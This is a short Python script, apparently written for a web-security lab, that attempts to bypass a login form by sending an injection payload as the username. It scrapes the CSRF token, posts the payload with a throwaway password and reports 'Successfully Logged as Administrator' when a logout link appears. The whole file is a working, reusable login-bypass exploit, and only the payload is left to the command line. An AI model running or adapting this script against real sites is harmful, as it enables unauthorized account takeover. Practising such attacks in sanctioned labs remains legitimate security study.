import requests
import urllib3 
import sys
from bs4 import BeautifulSoup
import re 

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def get_csrf(s, url):
    r = s.get(url, verify=False)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find('input')['value'] #<input name="csrf" required="" type="hidden" value="9Xb9IVXaKPvCqZxmCMkP16B1RW9D5ivy"/>
    return csrf



def exploit_login(s, url, payload):
    csrf = get_csrf(s, url)
    data = {
        'csrf' : csrf,
        'username' : payload,
        'password' : 'randomtext'
    }

    r = s.post(url, data, verify=False)
    response = r.text 
    soup = BeautifulSoup(response, 'html.parser')
    checkData = soup.find(string=re.compile('Log out',re.IGNORECASE))
    if checkData:
        return True
    else:
        return False

if __name__ == '__main__':
    if len(sys.argv) != 3:
        print("[-] Usage : python3 %s <url> <payload>"%sys.argv[0])
        print("[-] Usage : python3 %s www.example.com 'admin' "%sys.argv[0])
    else :  
        url = sys.argv[1].strip()
        s = requests.Session()
        payload = sys.argv[2].strip()
        if exploit_login(s, url, payload):
            print('\n[+] Successfully Logged as Administrator')
        else:
            print('\n[-] Failed to get the login ')

    
    
